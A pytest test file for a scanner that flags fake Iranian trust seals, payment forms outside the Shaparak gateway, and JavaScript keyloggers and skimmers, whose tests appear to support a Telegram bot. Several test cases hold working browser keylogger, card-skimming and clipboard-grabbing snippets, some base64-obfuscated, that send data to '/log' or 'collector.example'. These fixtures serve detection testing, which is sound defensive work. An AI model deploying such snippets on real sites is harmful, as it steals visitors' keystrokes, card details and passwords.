import base64
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest

import analyzer.scanner as scanner
from analyzer.enamad_checker import check_enamad, collect_seals, reference_domains
from analyzer.http_client import FetchError
from analyzer.javascript_analysis import analyze_sources
from analyzer.keylogger_detector import check_keylogger
from analyzer.models import CheckResult, Finding, Page, ScanResult, Status
from analyzer.page_signals import local_phishing_findings
from config import Settings
from main_bot import render_result


class FixtureFetcher:
    def __init__(self, pages=None, script_limit=4, frame_limit=2):
        self.pages = pages or {}
        self.settings = SimpleNamespace(max_external_scripts=script_limit, max_frames=frame_limit)
        self.calls = []
        self.errors = []

    async def get(self, url, **kwargs):
        self.calls.append((url, kwargs))
        value = self.pages.get(url, FetchError("timeout"))
        if isinstance(value, Exception):
            self.errors.append(value.code)
            raise value
        return value


PAYMENT_HTML = """<title>درگاه پرداخت اینترنتی</title>
<label for="pan">شماره کارت</label><input id="pan" autocomplete="cc-number">
<input id="cvv" placeholder="CVV2"><input id="otp" placeholder="رمز دوم/پویا">
<a href="https://trustseal.enamad.ir/?id=42"><img alt="اینماد" src="badge.webp"></a>"""


async def test_gateway_evidence_survives_unreachable_official_seal():
    result = await check_enamad(Page("https://checkout.example/", PAYMENT_HTML), FixtureFetcher())
    assert result.status == Status.SUSPICIOUS
    assert "payment_form_outside_gateway" in {f.rule for f in result.findings}
    assert any("نامشخص" in warning for warning in result.warnings)


@pytest.mark.parametrize("url", ["https://checkout.shaparak.ir/", "https://shaparak.ir/"])
def test_payment_host_only_excludes_local_gateway_rule_not_all_analysis(url):
    assert not local_phishing_findings(Page(url, PAYMENT_HTML))


@pytest.mark.parametrize(
    "url",
    ["https://shaparak.ir.evil.test/", "https://evil-shaparak.ir/", "https://checkout.example/"],
)
def test_gateway_domain_boundary(url):
    assert local_phishing_findings(Page(url, PAYMENT_HTML))


def test_bank_words_in_blog_and_card_number_alone_do_not_trigger_gateway():
    assert not local_phishing_findings(
        Page("https://blog.example/", "<p>شماره کارت CVV2 رمز پویا</p>")
    )
    assert not local_phishing_findings(Page("https://shop.example/", '<input name="card-number">'))


async def test_onclick_seal_and_id_mismatch_are_checked():
    html = """<img alt="نماد اعتماد" src="https://trustseal.enamad.ir/logo.aspx?id=42&amp;Code=aaa"
        onclick="window.open('https://trustseal.enamad.ir/?id=99&amp;Code=bbb')">"""
    result = await check_enamad(Page("https://shop.example/", html), FixtureFetcher())
    assert result.status == Status.SUSPICIOUS
    assert "seal_identifier_mismatch" in {f.rule for f in result.findings}


async def test_copied_seal_domain_field_is_detected():
    link = "https://trustseal.enamad.ir/?id=42"
    reference = Page(link, '<span id="lblDomain">real-shop.example</span>')
    html = f'<a href="{link}"><img alt="اینماد" src="badge.webp"></a>'
    result = await check_enamad(
        Page("https://fake-shop.example/", html), FixtureFetcher({link: reference})
    )
    assert "seal_domain_mismatch" in {f.rule for f in result.findings}


async def test_domain_echo_in_reference_script_or_footer_is_not_verification():
    link = "https://trustseal.enamad.ir/?id=42"
    reference = Page(
        link, '<script>const example="shop.example"</script><footer>shop.example</footer>'
    )
    result = await check_enamad(
        Page("https://shop.example/", f'<a href="{link}">seal</a>'),
        FixtureFetcher({link: reference}),
    )
    assert result.status == Status.INCONCLUSIVE


def test_extract_exact_labeled_domain_and_ignore_example():
    assert reference_domains('<script>"fake.example"</script><p>دامنه: shop.example</p>') == {
        "shop.example"
    }


async def test_seal_image_with_no_click_target_is_inconclusive():
    result = await check_enamad(
        Page("https://shop.example/", '<img alt="اینماد" src="badge.webp">'), FixtureFetcher()
    )
    assert result.status == Status.INCONCLUSIVE


def test_script_opener_target_can_be_used_by_seal_checker():
    links, badge, _ = collect_seals(
        Page("https://shop.example/", '<img alt="اینماد" src="badge.webp">'),
        ["https://trustseal.enamad.ir/?id=42"],
    )
    assert badge and links == ["https://trustseal.enamad.ir/?id=42"]


@pytest.mark.parametrize(
    "code",
    [
        'let b=[]; document.addEventListener("keydown",take); function take(e){b.push(e.key)} setInterval(()=>send(),1000); function send(){fetch("/log",{method:"POST",body:b.join("")})}',
        'document.onkeydown = e => fetch("/log?key=" + encodeURIComponent(e.key));',
        'document.addEventListener("key\\x64own", e => { const v=e.key; const emit=fetch; emit("/log",{body:v}) });',
        'function forward(v){sink(v)} function sink(d){navigator.sendBeacon("/log",d)} document.addEventListener("keyup", e => forward(e.key));',
        'const socket=new WebSocket("wss://collector.example/"); document.onkeydown=e=>socket.send(e.key);',
        'const x=new XMLHttpRequest(); x.open("POST","/log"); document.onkeydown=e=>x.send(e.key);',
        'document.onkeydown=e=>{let image=new Image(); image.src="https://collector.example/?k="+e.key;};',
        'document.onkeydown=e=>window[atob("ZmV0Y2g=")]("/log",{body:e.key});',
        "document.onkeydown=e=>fetch(`/log?k=${e.key}`);",
    ],
)
def test_ast_tracks_keys_through_aliases_helpers_collections_and_transports(code):
    result = analyze_sources([("inline", code)])
    assert "keyboard_to_network" in {f.rule for f in result.findings}


def test_helper_chain_and_cross_script_card_form_data():
    sources = [
        (
            "form",
            'const card=document.getElementById("card"); const cvv=document.getElementById("cvv"); function pay(){window.submitForm({card_number:card.value, cvv2:cvv.value})} payButton.onclick=pay;',
        ),
        (
            "bridge",
            'window.submitForm=function(data){var fd=new FormData(); for(var k in data){fd.append(k,data[k])} postFD(fd)}; function postFD(fd){retry("/receive",{method:"POST",body:fd})} function retry(url,opts){return fetch(url,opts)}',
        ),
    ]
    result = analyze_sources(
        sources, "https://merchant.example/", {"card": {"card"}, "cvv": {"cvv"}}
    )
    assert "card_data_to_network" in {f.rule for f in result.findings}


def test_clipboard_promise_callback_to_network():
    code = 'function send(v){fetch("/receive",{method:"POST",body:JSON.stringify(v)})} navigator.clipboard.readText().then(t=>send({content:t}));'
    assert "clipboard_to_network" in {f.rule for f in analyze_sources([("inline", code)]).findings}


@pytest.mark.parametrize(
    "code",
    [
        'const example = `document.onkeydown = e=>fetch("/log",{body:e.key})`;',
        '// document.onkeydown=e=>fetch("/log",{body:e.key});',
        'document.onkeydown=e=>console.log(e.key); fetch("/health",{body:"ok"});',
        'const p=document.getElementById("password"); form.onsubmit=()=>fetch("/login",{method:"POST",body:p.value});',
        'const p=document.getElementById("search"); p.oninput=e=>fetch("/search?q="+e.target.value);',
    ],
)
def test_ast_benign_examples_do_not_trigger(code):
    assert not analyze_sources([("inline", code)], metadata={"search": {"search"}}).findings


async def test_literal_base64_code_is_parsed_without_execution():
    payload = 'document.onkeydown=e=>fetch("/log",{body:e.key});'
    encoded = base64.b64encode(payload.encode()).decode()
    html = f'<script>eval(atob("{encoded}"))</script>'
    result = await check_keylogger(Page("https://site.example/", html), FixtureFetcher())
    assert "keyboard_to_network" in {f.rule for f in result.findings}


async def test_unresolvable_dynamic_code_is_inconclusive():
    result = await check_keylogger(
        Page("https://site.example/", "<script>eval(downloadedCode)</script>"), FixtureFetcher()
    )
    assert result.status == Status.INCONCLUSIVE


@pytest.mark.parametrize("opener", ["new Function", "window.Function", "const run=eval; run"])
async def test_dynamic_constructor_and_alias_are_parsed_without_execution(opener):
    payload = 'document.onkeydown=e=>fetch("/log",{body:e.key});'
    encoded = base64.b64encode(payload.encode()).decode()
    html = f'<script>{opener}(atob("{encoded}"))</script>'
    result = await check_keylogger(Page("https://site.example/", html), FixtureFetcher())
    assert "keyboard_to_network" in {item.rule for item in result.findings}


async def test_unknown_function_constructor_is_not_reported_clean():
    result = await check_keylogger(
        Page("https://site.example/", "<script>new Function(downloadedCode)</script>"),
        FixtureFetcher(),
    )
    assert result.status == Status.INCONCLUSIVE


def test_function_named_script_retains_lexical_scope_and_return():
    code = 'const secret="ok"; function script(){const secret=document.getElementById("password").value; console.log(secret)} script(); fetch("https://other.example/",{body:secret});'
    assert not analyze_sources([("inline", code)]).findings


def test_ordinary_login_otp_is_not_misclassified_as_card_data():
    code = 'const pin=document.getElementById("otp"); form.onsubmit=()=>fetch("/login",{body:pin.value});'
    result = analyze_sources([("inline", code)], metadata={"otp": {"otp"}})
    assert not result.findings


async def test_malformed_javascript_is_not_reported_clean():
    result = await check_keylogger(
        Page("https://site.example/", "<script>function broken( {</script>"), FixtureFetcher()
    )
    assert result.status == Status.INCONCLUSIVE


async def test_static_import_and_named_expression_callback():
    child = "https://site.example/assets/child.js"
    page = Page(
        "https://site.example/", '<script type="module">import "./assets/child.js";</script>'
    )
    fetcher = FixtureFetcher(
        {child: Page(child, 'document.onkeydown=e=>fetch("/log",{body:e.key});')}
    )
    result = await check_keylogger(page, fetcher)
    assert result.status == Status.SUSPICIOUS
    assert fetcher.calls == [(child, {"kind": "script"})]


async def test_iframe_and_srcdoc_are_analyzed_and_limited():
    target = "https://frame.example/"
    frame = Page(target, '<script>document.onkeydown=e=>fetch("/log",{body:e.key});</script>')
    page = Page("https://site.example/", f'<iframe src="{target}"></iframe>')
    result = await check_keylogger(page, FixtureFetcher({target: frame}))
    assert result.status == Status.SUSPICIOUS
    skipped = await check_keylogger(page, FixtureFetcher(frame_limit=0))
    assert skipped.status == Status.INCONCLUSIVE
    srcdoc = Page(
        "https://site.example/",
        "<iframe srcdoc=\"&lt;script&gt;document.onkeydown=e=&gt;fetch('/log',{body:e.key});&lt;/script&gt;\"></iframe>",
    )
    assert (await check_keylogger(srcdoc, FixtureFetcher())).status == Status.SUSPICIOUS


async def test_shared_script_is_reanalyzed_with_each_frames_inputs_without_refetch():
    script_url = "https://static.example/submit.js"
    frame_url = "https://site.example/frame"
    script_tag = f'<script src="{script_url}"></script>'
    page = Page("https://site.example/", script_tag + f'<iframe src="{frame_url}"></iframe>')
    frame = Page(
        frame_url,
        '<input id="field" placeholder="رمز عبور" type="password">' + script_tag,
    )
    script = Page(
        script_url,
        'function submit(){fetch("https://other.example/collect",{body:document.getElementById("field").value})} form.onsubmit=submit;',
    )
    fetcher = FixtureFetcher({script_url: script, frame_url: frame})
    result = await check_keylogger(page, fetcher)
    assert "password_to_external_host" in {item.rule for item in result.findings}
    assert [url for url, _ in fetcher.calls].count(script_url) == 1


async def test_frame_payment_evidence_is_preserved_and_seal_context_is_not_mixed():
    frame_url = "https://frame.example/"
    frame = Page(
        frame_url,
        PAYMENT_HTML + '<script>window.open("https://trustseal.enamad.ir/?id=66")</script>',
    )
    page = Page("https://site.example/", f'<iframe src="{frame_url}"></iframe>')
    fetcher = FixtureFetcher({frame_url: frame})
    await check_keylogger(page, fetcher)
    result = await check_enamad(page, fetcher)
    assert result.status == Status.SUSPICIOUS
    assert "payment_form_outside_gateway" in {item.rule for item in result.findings}
    assert fetcher.seal_urls == []


async def test_challenge_html_is_not_reported_clean():
    page = Page(
        "https://site.example/", "<title>Just a moment...</title><script>cfChallenge()</script>"
    )
    assert (await check_keylogger(page, FixtureFetcher())).status == Status.INCONCLUSIVE


async def test_local_payment_evidence_survives_global_scan_timeout(monkeypatch):
    monkeypatch.setattr(
        scanner.Fetcher, "get", AsyncMock(return_value=Page("https://site.example/", PAYMENT_HTML))
    )
    monkeypatch.setattr(scanner, "check_keylogger", AsyncMock(side_effect=TimeoutError()))
    result = await scanner.scan_url("https://site.example/", Settings())
    assert result.status == Status.SUSPICIOUS
    assert result.phishing.findings[0].rule == "payment_form_outside_gateway"


def test_expanded_telegram_report_stays_within_visible_message_limit():
    findings = tuple(Finding(str(i), "<" * 1000, "inline:1") for i in range(6))
    check = CheckResult(
        Status.SUSPICIOUS, "<" * 1000, tuple("<" * 1000 for _ in range(8)), findings, "<" * 1000
    )
    text = render_result(
        ScanResult("https://site.example/?" + "<" * 1500, check, check, 1, ("timeout",))
    )
    from bs4 import BeautifulSoup

    assert len(BeautifulSoup(text, "html.parser").get_text()) < 4096


def test_logging_and_void_helpers_do_not_invent_tainted_return_values():
    scripts = [
        'document.onkeydown=e=>{const nothing=console.log(e.key); fetch("/health",{body:nothing});};',
        'function log(x){console.log(x)} document.onkeydown=e=>{const nothing=log(e.key);fetch("/health",{body:nothing})};',
    ]
    for script in scripts:
        assert not analyze_sources([("inline", script)]).findings


async def test_inline_finding_is_preserved_when_followup_is_cancelled(monkeypatch):
    html = '<script>document.onkeydown=e=>fetch("/log",{body:e.key});</script><script src="/slow.js"></script>'

    async def get_page(self, url, **kwargs):
        if kwargs.get("kind") == "script":
            raise TimeoutError()
        return Page("https://site.example/", html)

    monkeypatch.setattr(scanner.Fetcher, "get", get_page)
    result = await scanner.scan_url("https://site.example/", Settings())
    assert result.keylogger.status == Status.SUSPICIOUS
    assert result.keylogger.findings[0].rule == "keyboard_to_network"
